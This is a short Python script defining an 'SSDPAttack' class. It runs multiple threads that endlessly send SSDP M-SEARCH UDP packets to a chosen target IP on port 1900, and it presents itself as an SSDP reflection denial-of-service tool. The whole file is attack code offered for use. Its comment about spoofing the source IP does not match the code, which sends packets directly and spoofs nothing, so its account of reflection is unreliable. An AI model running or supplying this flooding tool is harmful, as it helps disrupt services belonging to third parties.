import socket
import threading

class SSDPAttack:
    def __init__(self, target_ip, payload=None):
        self.target_ip = target_ip
        self.payload = payload or b"M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n"
        self.running = False
        self.threads = []

    def ssdp_reflect(self):
        """Send SSDP reflection packets"""
        while self.running:
            try:
                # Spoof source IP to be the target
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.bind(('0.0.0.0', 0))
                s.sendto(self.payload, (self.target_ip, 1900))
                s.close()
            except:
                pass

    def start(self, threads=10):
        """Start SSDP reflection attack"""
        self.running = True
        for _ in range(threads):
            t = threading.Thread(target=self.ssdp_reflect)
            t.daemon = True
            t.start()
            self.threads.append(t)

    def stop(self):
        """Stop SSDP reflection attack"""
        self.running = False
        for t in self.threads:
            t.join()
